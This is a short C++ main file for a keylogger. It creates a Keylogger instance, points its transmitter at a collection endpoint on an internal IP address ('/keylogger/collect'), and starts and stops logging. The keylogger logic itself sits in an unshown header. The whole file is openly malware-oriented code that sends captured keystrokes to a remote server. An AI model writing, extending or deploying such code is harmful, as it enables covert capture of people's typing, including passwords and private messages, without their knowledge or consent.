#include "keylogger.h"


int main() {
	Keylogger& keylogger = Keylogger::get_instance();

	keylogger.set_transmiter_conf("http://10.0.0.10:5000/keylogger/collect", 100, 10);

	keylogger.start(true, false, false);
	keylogger.stop();

	return 0;
}